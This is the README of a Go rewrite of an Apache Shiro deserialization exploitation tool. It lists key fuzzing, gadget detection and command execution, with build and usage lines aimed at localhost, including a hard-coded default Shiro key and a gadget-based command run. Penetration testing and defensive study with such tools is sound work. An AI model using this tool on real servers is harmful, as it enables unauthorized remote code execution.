DearShiro Go

Golang入门练手，[DearShiro](https://github.com/F4ded/DearShiro)的Golang改写版。

无需Java环境，序列化数据由golang原生生成，感谢@EmYiQing师傅提供的[Gososerial](https://github.com/EmYiQing/Gososerial)项目。


已完成: 
- 探测Key
- 探测可用gadget
- 利用gadget执行命令

```
go build -ldflags "-w -s" dearshiro.go
```

```
./dearshiro

./dearshiro {kfuzz | gfuzz | cexec} --help

./dearshiro kfuzz http://127.0.0.1:8000

./dearshiro gfuzz http://127.0.0.1:8080 -k=kPH+bIxk5D2deZiIxcaaaA==

./dearshiro cexec http://127.0.0.1:8000 [-k] -g=CCK1 -c='Open -a Calculator'
```
